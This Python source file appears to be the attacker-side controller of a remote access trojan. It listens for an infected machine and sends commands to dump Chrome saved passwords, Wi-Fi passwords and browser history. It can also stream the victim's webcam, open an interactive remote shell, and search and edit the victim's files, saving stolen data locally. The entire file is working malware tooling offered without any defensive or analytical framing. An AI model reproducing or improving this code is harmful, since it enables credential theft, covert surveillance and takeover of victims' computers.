import socket, os, struct, pickle, threading, cv2, time
import numpy as np

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

webcam_port = 6970
def webcam():
   global webcam_port
   r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   r.bind(('', webcam_port))
   r.listen(1)
   r, addr = r.accept()
   webcam_port += 1
   try:
      data = b''
      payload_size = struct.calcsize("L")
      while True:
         while  len(data) < payload_size:
            data += r.recv(61440)
         packed_msg_size = data[:payload_size]

         data = data[payload_size:]
         msg_size = struct.unpack("L", packed_msg_size)[0]
         while len(data) < msg_size:   
            data += r.recv(61440)
         frame_data = data[:msg_size]
         data = data[msg_size:]
         frame = pickle.loads(frame_data)
         cv2.imshow(str(addr), frame)
         key = cv2.waitKey(27)
         if key == 27:
            cv2.destroyAllWindows()
            break
   except:
      pass
   
def loading(title, seconds):
   loadbarwidth = 25
   for i in range(1, loadbarwidth + 1):
      time.sleep(seconds)
      strbarwidth = '[{}{}] - {}\r'.format((i * '#'), ((loadbarwidth - i) * '-'), (('{:0.2f}'.format(((i) * (100/loadbarwidth))) + '%')))
      print(title, strbarwidth ,end = '')

history_port = 6968
def history_dump():
   global history_port
   n = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   n.bind(('', history_port))
   n.listen(1)
   n, addr = n.accept()
   history_port -= 1
   file = open(r'C:\Users\Public\History.txt', 'a')
   n.settimeout(3)
   while True:
      try:
         recv = n.recv(61440).decode()
         file.write(recv)
         n.send('1'.encode())
      except:
         break
   
def listener():
   global s
   port = int(input('Port: '))
   s.bind(('', port))
   s.listen(1)
   print("Listener running and waiting for connection")
   s, addr = s.accept()
   print("Listener running with connection from", addr)
   while True:
      message = input('> ')
      if message == '':
         s.send('1'.encode())
         recv = s.recv(61440).decode()
      elif message == 'edit':
         s.send(message.encode())
         recv = s.recv(61440).decode()
         print(recv)
         s.send(input('> ').encode())
         recv = s.recv(61440).decode()
         file = open(r'C:\Users\Public\edit_file.txt', 'w')
         file.write('')
         file.write(recv)
         file.close()
         os.startfile(r'C:\Users\Public\edit_file.txt')
         input('Press enter when done')
         file = open(r'C:\Users\Public\edit_file.txt', 'r')
         s.send(file.read().encode())
         file.close()
         recv = s.recv(61440).decode()
         print(recv)
      elif message == 'info':
         s.send(message.encode())
         recv = s.recv(61440).decode()
         recv1 = recv.replace('ip', f'Ip and Port: {str(addr)}')
         print(recv1)
      elif message == 'google dump':
         if os.path.isfile(r'C:\Users\Public\google passwords.txt') == True:
            print('Passwords already dumped')
         else:
            s.send(message.encode())
            recv = s.recv(61440).decode()
            if recv == 'Chrome is running in the background':
               print('Chrome is running in the background')
            elif recv == 'Chrome does not exist':
               print('Chrome does not exist')
            write = recv.replace('}', """
""")
            write1 = write.replace('{', '')
            write2 = write1.replace("'username':", '   ')
            write3 = write2.replace("'origin_url':", '')
            write4 = write3.replace("password':", '   ')
            write5 = write4.replace("b'", '')
            write6 = write5.replace(",", '')
            write7 = write6.replace("'", '')
            write8 = write7.replace('[', '')
            write9 = write8.replace(']', '')
            f = open(r'C:\Users\Public\passwords.txt', 'w')
            f.write(write9)
            f.close()
      elif message == 'webcam':
         t1 = threading.Thread(target=webcam)
         t1.start()
         s.send('webcam'.encode())
         recv = s.recv(61440).decode()
         print(recv)
         time.sleep(3)
      elif message == 'shell':
         s.send('shell'.encode())
         while True:
            recv = s.recv(61440).decode()
            print(recv)
            message = input('>>> ')
            if message == 'exit':
               s.send('exit'.encode())
               recv = s.recv(61440).decode()
               print(recv)
               break
            else:
               s.send(message.encode())
      elif message == 'find':
         s.send('find'.encode())
         recv = s.recv(61440).decode()
         print(recv)
         message = input('> ')
         if message == 'cancel':
            s.send('cancel'.encode())
            recv = s.recv(61440).decode()
            print(recv)
         else:
            s.send(message.encode())
            loading('Finding files', 0.4)
            recv = s.recv(61440).decode()
            print(f"\n{recv}")
      elif message == 'wifi dump':
         if os.path.isfile(r'C:\Users\Public\wifi passwords.txt') == True:
            print('Passwords already dumped')
         else:
            s.send('wifi dump'.encode())
            t1 = threading.Thread(target=loading, args=('Collecting passwords', 0.2,))
            t1.start()
            file = open(r'C:\Users\Public\wifi passwords.txt', 'w+')
            recv = s.recv(61440).decode().replace(',', """
""").replace('"', '').replace("'", '').replace('[', '').replace(']', '')
            file = open(r'C:\Users\Public\wifi passwords.txt', 'w')
            file.write(recv)
            file.close()
      elif message == 'history dump':
         if os.path.isfile(r'C:\Users\Public\History.txt') == True:
            print('History already dumped')
         else:
            s.send('history dump'.encode())
            history_dump()
      else: 
         s.send(message.encode())
         recv = s.recv(61440).decode()
         print(f"""{recv}""")
listener()